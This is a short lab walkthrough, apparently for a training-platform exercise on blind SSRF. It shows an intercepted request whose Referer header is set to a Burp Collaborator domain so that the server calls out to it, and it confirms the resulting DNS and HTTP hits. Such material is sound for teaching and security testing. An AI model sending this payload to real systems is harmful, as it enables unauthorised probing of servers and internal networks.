
# Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/ssrf



<img width="855" height="572" alt="1" src="https://github.com/user-attachments/assets/ee4d9ec2-44a7-4be2-892d-dc5a7300ba97" />


---------------------------------------------

Intercept the request generated when opening a product, then change the `Referer` header:

```
GET /product?productId=1 HTTP/2
...
Referer: http://snjtorvmsesj9itkltcgrqtsfjla92xr.oastify.com
...
```



<img width="986" height="384" alt="2" src="https://github.com/user-attachments/assets/126e88ba-8974-4a5b-ae72-70b6118b0e26" />



DNS and HTTP requests are received by the Collaborator domain:



<img width="894" height="134" alt="3" src="https://github.com/user-attachments/assets/701f90fd-b6a1-4d8b-aed2-95f9ce09f8bb" />
